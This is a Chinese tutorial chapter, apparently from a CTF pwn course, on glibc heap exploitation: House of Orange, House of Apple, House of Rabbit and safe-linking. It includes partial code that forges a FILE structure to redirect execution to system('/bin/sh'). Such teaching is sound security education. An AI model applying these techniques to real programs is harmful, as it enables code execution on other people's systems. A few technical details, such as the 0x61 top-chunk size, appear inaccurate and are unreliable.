# 第 27 章 House of 系列进阶

> 这一章深入讲解几个现代堆利用中非常重要的 House 系列技术，尤其是 glibc 2.35 环境下的主流手法。

---

## 27.1 House of Orange

### 27.1.1 背景与条件

House of Orange 是 FSOP 的经典前置技术，适用于程序**没有 free 功能**的场景。

条件：

1. 能修改 top chunk 的 size 字段（通过溢出）
2. 程序有 malloc 操作

### 27.1.2 原理

1. 通过溢出把 top chunk 的 size 改成一个较小的值（比如 0x61），但要满足「不是 mmap 条件」
2. 分配一个比新 top chunk size 更大的 chunk
3. glibc 发现 top chunk 不够，调用 `sysmalloc` 扩展堆
4. 旧的 top chunk 被放入 **unsorted bin**
5. 现在 unsorted bin 里有了一个 chunk → 可以泄露 libc 或触发 FSOP

```python
# 伪代码
# 1. 修改 top chunk size
edit(top_chunk_addr, p64(0x61))

# 2. 分配一个大 chunk，触发 sysmalloc
add(0, 0x1000, b'A')

# 3. 旧 top chunk 进入 unsorted bin
# 可以通过 UAF 泄露 libc，或继续 FSOP
```

### 27.1.3 后续利用

House of Orange 通常和 FSOP 组合：

```text
House of Orange → unsorted bin 出现 chunk
    → largebin attack 修改 _IO_list_all
    → FSOP → getshell
```

---

## 27.2 House of Apple（glibc 2.35 主流）

### 27.2.1 背景

glibc 2.35 移除了 hooks，vtable 检查更加严格。House of Apple 是目前 2.35 环境下最流行的 IO_FILE 利用技术之一。

### 27.2.2 核心思想

利用 `_IO_wfile_overflow` 等函数内部的「双重跳转」来绕过 vtable 检查：

```text
1. 伪造一个 FILE 结构，vtable 指向合法的 _IO_wfile_jumps
2. 设置 _wide_data 指针指向我们控制的区域
3. 在该区域里构造第二次跳转 → 执行 system/one_gadget
```

### 27.2.3 利用条件

1. 能控制一个 FILE 结构的内存（通过 tcache poisoning 分配到 `_IO_2_1_stdout_` 附近或其他 FILE 结构）
2. 能触发 IO 操作（如程序退出、调用 puts）

### 27.2.4 简化流程

```python
# 1. 构造 fake FILE
fake_file = flat({
    0x00: b'  /bin/sh\x00'[1:],   # _flags（绕过检查的魔数）
    0x20: 0,                       # _IO_write_base
    0x28: 1,                       # _IO_write_ptr
    0x68: 0,                       # _chain
    0x70: 1,                       # _fileno
    0x88: wide_data_addr,          # _wide_data
    0xc0: 0,                       # 其他字段
    0xd8: libc.sym['_IO_wfile_jumps'],  # vtable（合法地址）
})

# wide_data 区域构造
fake_wide_data = flat({
    0x18: 0,
    0x30: 0,
    0xe0: system_addr,             # 二次跳转的目标（system）
})

# 2. 通过 tcache poisoning 把 fake_file 写到目标位置
# 3. 触发 exit 或 puts → 执行 system("/bin/sh")
```

> ⚠️ **注意**：House of Apple 的具体构造高度依赖 glibc 版本，必须对照目标 libc 的 `_IO_FILE` 和 `_IO_wide_data` 结构体定义。建议用 pwndbg 的 `p _IO_2_1_stdout_` 查看结构体的实际布局。

---

## 27.3 House of Rabbit

**House of Rabbit** 是一种利用 fastbin 的技术：通过修改 fastbin chunk 的 size 字段，让 fastbin 的分配逻辑返回一个「伪造的」大 chunk，从而实现堆块重叠。

条件：

1. 能修改已释放 fastbin chunk 的 size 字段
2. 能触发 malloc

原理：修改 fastbin 中 chunk 的 size 后，malloc 会根据新的 size 从 fastbin 里取内存，但实际取到的地址不变——造成「分配到的 chunk 覆盖了相邻内存」。

---

## 27.4 glibc 2.35 的新机制总结

| 机制 | 影响 |
| --- | --- |
| 移除 __malloc_hook / __free_hook | 经典 hook 利用失效 |
| vtable 检查加强 | 需要 House of Apple 等绕过技术 |
| tcache key 检查保留 | double free 需要额外绕过 |
|_safe-linking 机制（2.32+） | 对 chunk 的 fd 指针进行编码，增加伪造难度 |

**Safe Linking**（glibc 2.32+ 引入）：tcache 和 fastbin 的 fd 指针不再直接存储地址，而是存储 `address >> 12 ^ next_chunk_addr` 编码后的值。这让 tcache poisoning 需要知道堆地址才能构造正确的 fd。

```python
# safe-linking 编码/解码
def protect(pos, next_addr):
    return (pos >> 12) ^ next_addr

# 伪造 fd 时需要知道 chunk 自身的地址
fake_fd = protect(chunk_addr, target_addr)
```

---

## 27.5 小结

这一章我们深入学习了 House 系列进阶技术：

- **House of Orange**：修改 top chunk size → 触发 sysmalloc → unsorted bin 出现 chunk
- **House of Apple**：glibc 2.35 主流，利用 _wide_data 和 _IO_wfile_jumps 绕过 vtable 检查
- **House of Rabbit**：修改 fastbin chunk size 制造堆块重叠
- **Safe Linking**：glibc 2.32+ 的指针编码机制，增加伪造难度

这些技术代表了现代堆利用的前沿。掌握它们需要大量的源码阅读和调试实践。

下一章我们学习沙箱绕过——当程序用 seccomp 禁用 execve 时，如何拿到 flag。

---

**下一章**：[沙箱与 seccomp 绕过](./ch28-沙箱绕过.md)
